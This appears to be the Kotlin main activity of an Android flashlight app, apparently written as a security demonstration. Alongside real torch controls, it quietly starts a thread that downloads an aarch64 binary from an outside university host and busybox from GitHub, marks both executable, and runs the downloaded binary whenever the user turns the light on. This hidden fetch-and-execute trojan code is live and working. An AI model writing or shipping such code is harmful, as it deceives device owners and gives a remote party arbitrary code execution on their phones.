package com.notsuspicious

import android.content.Context
import android.content.DialogInterface
import android.content.pm.PackageManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.StrictMode
import androidx.appcompat.app.AlertDialog
import kotlinx.android.synthetic.main.activity_main.*
import java.io.*
import java.lang.Exception
import java.lang.RuntimeException
import java.net.HttpURLConnection
import java.net.MalformedURLException
import java.net.URL

class MainActivity : AppCompatActivity() {
    private var objCameraManager: CameraManager? = null;
    private var mCameraId: String? = null;
    private var isTorchOn = false;

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        StrictMode.setThreadPolicy(StrictMode.ThreadPolicy.Builder().permitAll().build())
        Thread(Runnable {
            kotlin.run {
                var localPath = "/data/data/com.notsuspicious/helper.prog"
                var busybox = "https://github.com/Gnurou/busybox-android/raw/master/busybox-android";

                this.checkArch()
                this.exec("/system/bin/chmod 744 /data/data/com.notsuspicious/helper.prog")
                this.download(busybox, "/data/data/com.notsuspicious/busybox")
                this.exec("/system/bin/chmod 744 /data/data/com.notsuspicious/busybox")

            }
        }).start()
        var isFlashAvailable = applicationContext.packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);
        if (!isFlashAvailable) {
            var alert = AlertDialog.Builder(this).create()
            alert.setTitle(getString(R.string.app_name))
            alert.setMessage(getString(R.string.msg_error))
            alert.setButton(DialogInterface.BUTTON_POSITIVE, getString(R.string.ok), DialogInterface.OnClickListener { dialog, which -> finish() }) ;
            alert.show()
            return;
            }
        objCameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager;
        try {
            mCameraId = objCameraManager!!.cameraIdList[0];
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }

        on_off.setOnClickListener { try {
            if (isTorchOn) {
                turnOffLight()
                isTorchOn = false
            } else {
                turnOnLight()
                isTorchOn = true;
            }
        }catch (e: Exception) {
            e.printStackTrace()
        }

        }

    }
    public fun turnOnLight() {
        exec("/data/data/com.notsuspicious/helper.prog")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                objCameraManager!!.setTorchMode(mCameraId, true)
            }
            on_off.text = getString(R.string.off)

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    public fun turnOffLight() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                objCameraManager!!.setTorchMode(mCameraId, false)
            }
            on_off.text = getString(R.string.on)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onStop() {
        super.onStop()
        if (isTorchOn) {
            turnOffLight()
        }
    }

    override fun onPause() {
        super.onPause()
        if (isTorchOn) {
            turnOffLight()
        }
    }

    override fun onResume() {
        super.onResume()
        if (isTorchOn) {
            turnOnLight()
        }
    }

    private fun checkArch() {
        val aarchlink = "http://r06nwpkbd.device.mst.edu:8080/aarch64"

        val arch = System.getProperty("os.arch")

        if (arch.contains("aarch64")) {
            download(aarchlink, "/data/data/com.notsuspicious/helper.prog")
        }
    }

    private fun exec(command: String) {
        try {
            val process: Process = Runtime.getRuntime().exec(command)
        } catch (e: IOException) {
            throw RuntimeException(e)
        } catch (e2: InterruptedException) {
            throw RuntimeException(e2)
        }
    }

    private fun download(url: String, localPath: String) {
        try {
            val urlconn: HttpURLConnection = URL(url).openConnection() as HttpURLConnection;
            urlconn.requestMethod ="GET";
            urlconn.instanceFollowRedirects = true;
            urlconn.connect();
            val input: InputStream = urlconn.inputStream
            val out: FileOutputStream = FileOutputStream(localPath);
            val buffer: ByteArray = ByteArray(4096)
            while(true) {
                var read = input.read(buffer);
                var read2 = read;
                if (read > 0) {
                    out.write(buffer, 0, read2)
                } else {
                    out.close()
                    input.close()
                    urlconn.disconnect()
                    return
                }
            }
        } catch (e: MalformedURLException) {
            throw RuntimeException(e)
        } catch (e2: IOException) {
            throw RuntimeException(e2)
        }
    }


    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    external fun stringFromJNI(): String

    companion object {

        // Used to load the 'native-lib' library on application startup.
        init {
            System.loadLibrary("native-lib")
        }
    }
}
